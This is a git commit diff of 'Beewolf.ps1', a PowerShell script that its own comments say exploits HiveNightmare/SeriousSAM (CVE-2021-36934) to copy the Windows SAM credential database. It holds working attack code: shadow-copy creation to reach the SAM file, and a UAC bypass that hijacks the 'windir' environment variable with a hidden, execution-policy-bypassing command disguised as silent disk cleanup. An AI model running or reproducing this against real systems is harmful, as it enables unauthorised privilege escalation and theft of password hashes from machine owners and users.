3a364a24579695e00b2ad67a280cf3394deb4440
JoustingZebra <80557158+JoustingZebra@users.noreply.github.com>
2021-10-01 11:13:57 -0400

    Added comments

--- Beewolf.ps1
+++ Beewolf.ps1
@@ -1,10 +1,15 @@
-#Working???
+# OSG
+# ⌨ >= ⚔
+# Beewolf.ps1
+# Powershell V 7/5/2
+# This script exploits HiveNightmare/SeriousSAM (CVE-2021-36934) to copy the SAM database to an accessible location.
+
+# Line #8 can be removed if version 2 is inaccessible. Comment-out line #38 and un-comment line #39 if you remove line #8.
 #Requires -Version 2.0
 
 # If current user belongs to built-in Admins group execute payload directly
 if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
-    #Payload goes here
-    #It'll run as Administrator (even if script is executed from non-priviliged)
+    #This runs as Administrator (even if script is executed from non-priviliged)
     $syslink1 = (Get-WmiObject -List Win32_ShadowCopy).Create("$env:SystemDrive\\", "ClientAccessible")
     $syslink2 = Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $syslink1.ShadowID }
     $directory = $syslink2.DeviceObject + "\\"
@@ -25,11 +30,12 @@ if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S
         cmd /c rmdir $env:SystemDrive\shadowcopy
     }
 }
-	
+# If script is not called w/ admin priviliges, disguise self as silent disk cleanup and call it.
 else {
     $registryPath = "HKCU:\Environment"
     $Name = "windir"
     $Value = "powershell.exe -Version 2 -ep bypass -w hidden -Command `"& `'$PSCommandPath`'`";#"
+    #$Value = "powershell.exe -ep bypass -w hidden -Command `"& `'$PSCommandPath`'`";#"
     Set-ItemProperty -Path $registryPath -Name $name -Value $Value
     #Depending on the performance of the machine, some sleep time may be required before or after schtasks
     Start-Sleep -s 1
